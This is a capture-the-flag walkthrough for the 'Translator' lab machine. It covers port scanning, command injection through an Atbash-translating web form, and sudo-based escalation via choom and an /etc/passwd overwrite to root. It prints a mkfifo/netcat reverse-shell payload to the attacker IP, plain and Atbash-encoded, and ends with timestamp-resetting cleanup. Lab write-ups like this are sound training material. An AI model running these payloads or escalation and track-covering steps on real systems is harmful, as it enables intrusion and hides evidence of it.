+++
title = "Translator - Walkthrough"
date = "2026-07-06"
author = "nvru"
description = "Walkthrough for the Translator machine."
tags = ["ctf", "walkthrough", "linux", "web", "command-injection", "privilege-escalation"]
draft = false
+++

![Translator VM](/images/hmv/translator/vm.png)

## Target Information

| Role     | IP Address    |
| -------- | ------------- |
| Attacker | `10.10.10.2`  |
| Machine  | `10.10.10.13` |

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.13 -- -oA nmap/rust
```

#### Results

```text
Open 10.10.10.13:22
Open 10.10.10.13:80

[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -oA nmap/rust" on ip 10.10.10.13

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

---

### Nmap

```bash
nmap -sSCV -A -p22,80 -oA nmap/22_80 --min-rate=1000 10.10.10.13
```

#### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)

| ssh-hostkey:
|   3072 08:cf:50:b2:4f:41:43:c4:66:56:ce:96:b9:04:8c:77 (RSA)
|   256 40:b7:11:24:76:59:cd:e0:79:db:71:d1:39:29:d5:45 (ECDSA)
|_  256 44:64:ba:b8:52:4f:ca:00:dd:3e:c3:28:71:6f:77:76 (ED25519)

80/tcp open  http    nginx 1.18.0

|_http-title: Site doesn't have a title (text/html)
|_http-server-header: nginx/1.18.0
```

Only two TCP ports are exposed:

- **22** - OpenSSH
- **80** - HTTP (nginx)

---

# Enumeration

## HTTP (Port 80)

Browsing to the web server reveals a simple page containing a text input field.

![HTTP Form](/images/hmv/translator/http.png)

![Curl ](/images/hmv/translator/send_hello.png)

When entering the string:

```text
hello
```

the application returns:

```text
svool
```

![Cyber Chef](/images/hmv/translator/cyber_chef.png)

- `https://gchq.github.io/CyberChef/`

Initially I attempted to identify the encoding using CyberChef, but no automatic detection succeeded. After testing several classical ciphers, the output was identified as the **Atbash cipher**.

---

## Command Injection

Since the application appeared to process user input on the backend, I tested for command injection.

Simple payloads did not produce visible output. However, the absence of output does not necessarily mean the application is not vulnerable, so I tested several reverse shell payloads.

The standard Bash reverse shell failed, but the classic **mkfifo + nc** payload successfully established a reverse shell.

Because the application translates the supplied input using the **Atbash cipher** before processing it, the payload must first be encoded with Atbash. The server then decodes it back to the original command and executes it.

![Reverse Shell](/images/hmv/translator/rev_shell_web.png)

### Original Payload

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.2 9001 >/tmp/f
```

### Atbash-Encoded Payload

```bash
in /gnk/u;npurul /gnk/u;xzg /gnk/u|hs -r 2>&1|mx 10.10.10.2 9001 >/gnk/u
```

---

# Initial Access

After stabilizing the shell, I checked the current user's sudo permissions.

```bash
sudo -l
```

A password was required, so I continued enumerating the web directory.

Inside `/var/www/html` I discovered a strangely named file.

![Web Directory](/images/hmv/translator/file_www.png)

The filename was:

```text
hvxivg
```

Its contents were:

```text
Mb kzhhdliw rh zbfie3w4
```

Because the web application itself uses the Atbash cipher, I decoded both the filename and the file contents.

Filename:

```text
hvxivg
```

↓

```text
secret
```

Contents:

```text
Mb kzhhdliw rh zbfie3w4
```

↓

```text
My password is ayurv3d4
```

![Decoded Filename](/images/hmv/translator/file_name_dcode.png)

![Decoded Password](/images/hmv/translator/pass_decode.png)

- `https://www.dcode.fr/atbash-cipher`

---

---

## Privilege Escalation

### User Enumeration

Since I already had a shell, enumerating local users was straightforward.

```bash
ls /home
```

or

```bash
cat /etc/passwd
```

The machine contained two users:

- `india`
- `ocean`

Using the recovered password, only the **ocean** account authenticated successfully.

```text
ocean : ayurv3d4
```

![Switch to ocean](/images/hmv/translator/su_ocean.png)

![Users](/images/hmv/translator/users.png)


### ocean → india

Checking sudo permissions again revealed that **ocean** could execute **choom** as the **india** user.

```bash
sudo -l
```

![sudo -l](/images/hmv/translator/su_india.png)

Reading both the man page and GTFOBins revealed that `choom` can execute arbitrary commands.

Useful references:

- https://gtfobins.org/gtfobins/choom/
- https://man7.org/linux/man-pages/man1/choom.1.html

The following command spawns a Bash shell as **india**.

```bash
choom -n 0 /bin/bash
```

Where:

- `-n` specifies the adjustment score.
- `/bin/bash` is the command to execute.

![choom Man Page](/images/hmv/translator/choom_man_page.png)

After obtaining the shell, I switched to SSH for a more stable session.

---

### india → root

Checking sudo permissions as **india** revealed the following binary could be executed as **root** without a password.

```text
/usr/local/bin/trans
```

The binary is a translation utility capable of translating files using several translation engines.

Reading its manual page showed that it accepts files as input and allows writing the translated output to another file.

![trans Man Page](/images/hmv/translator/man_trans.png)

My initial idea was to read `/root/.ssh/id_rsa`, but no private key existed.

![No Root SSH Key](/images/hmv/translator/no_id_root.png)

Instead, I targeted `/etc/passwd`.

First, I created a backup of the file.

The `trans` utility reformats text, repeats lines, and inserts additional whitespace, so having a backup proved useful during testing.

I generated a password hash using OpenSSL.

```bash
openssl passwd -6
```

Then I created a modified copy of `/etc/passwd` containing a new user with UID **0** and GID **0**, effectively granting root privileges.

After overwriting the original `/etc/passwd`, I logged in using the newly created account and obtained a root shell.

![Modified passwd](/images/hmv/translator/passwd_trans.png)

![passwd Differences](/images/hmv/translator/passwds_diff.png)

![Root Shell](/images/hmv/translator/root_shell.png)

---

## Cleanup

After obtaining root access, I restored the original `/etc/passwd` from the backup created during exploitation.

```bash
cp /dev/shm/passwd.bak /etc/passwd
```

Restoring the original file removes the temporary backdoor account and returns the system to its initial state.

![Clean passwd](/images/hmv/translator/passwd_Clean.png)

Since replacing `/etc/passwd` updates its timestamps, I restored the original modification time using:

```bash
touch -t 202205111435 /etc/passwd
```

This resets the file's timestamp, making the restored file consistent with its original metadata.

![Restore Timestamp](/images/hmv/translator/time_date_etc_passwd.png)

---

## Credentials

### SSH

```text
ocean : ayurv3d4
```

---

# Flags

```text
user flag : a6765hftgnhvugy473f
root flag : h87M5364V2343ubvgfy
```
